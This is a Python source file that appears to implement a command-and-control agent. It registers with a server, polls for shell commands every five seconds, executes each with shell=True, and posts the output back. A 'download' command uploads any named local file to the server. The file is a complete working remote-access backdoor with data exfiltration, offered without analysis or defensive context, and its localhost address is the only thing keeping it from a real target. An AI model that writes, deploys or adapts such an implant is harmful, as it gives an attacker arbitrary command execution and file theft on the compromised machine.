import requests
import subprocess
import time
import uuid
import os

SERVER_URL = 'http://127.0.0.1:5001'
AGENT_ID = str(uuid.uuid4())
REGISTER_ENDPOINT = f'{SERVER_URL}/register'  # Corrected endpoint
COMMAND_ENDPOINT = f'{SERVER_URL}/get_command'  # Adjusted endpoint
OUTPUT_ENDPOINT = f'{SERVER_URL}/send_output'  # Adjusted endpoint

def execute_command(command):
    if command.startswith("download "):
        filename = command.split(" ", 1)[1]  # Extract filename from command
        upload_file(filename)  # Assume this function uploads a file to the server
        return f"File {filename} uploaded successfully."
    else:
        # Original command execution logic
        try:
            result = subprocess.run(
                command,
                shell=True,
                check=True,
                text=True,
                capture_output=True
            )
            return result.stdout
        except subprocess.CalledProcessError as e:
            error_message = f"Error executing command: {e}\n"
            if hasattr(e, 'stderr') and e.stderr is not None:
                error_message += f"{e.stderr}\n"
            return error_message
        except Exception as e:
            return f"Error executing command: {e}"

def upload_file(file_path):
    upload_url = f"{SERVER_URL}/upload"
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            response = requests.post(upload_url, files=files, data={'agent_id': AGENT_ID})
            response.raise_for_status()
        print(f"Uploaded {file_path}")
    except Exception as e:
        print(f"Error uploading file: {e}")

def send_output(output):
    try:
        response = requests.post(OUTPUT_ENDPOINT, data={'agent_id': AGENT_ID, 'output': output})
        response.raise_for_status()
        print("Output sent successfully")
    except requests.exceptions.RequestException as e:
        print(f"Request Error: {e}")

def register_agent():
    try:
        response = requests.post(REGISTER_ENDPOINT, data={'agent_id': AGENT_ID})
        response.raise_for_status()
        print("Agent registered successfully")
    except requests.exceptions.RequestException as e:
        print(f"Registration Error: {e}")

def main():
    register_agent()

    while True:
        try:
            print("Fetching command from server...")
            response = requests.get(COMMAND_ENDPOINT, params={'agent_id': AGENT_ID})
            if response.status_code == 200:
                data = response.json()
                command_to_execute = data.get('command', '')
                print(f"Received command: {command_to_execute}")
                if command_to_execute:
                    output = execute_command(command_to_execute)
                    print(f"Command output: {output}")
                    send_output(output)
                else:
                    print("No command received from server")
            else:
                print(f"Failed to fetch command. Status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request Error: {e}")
        time.sleep(5)

if __name__ == "__main__":
    main()
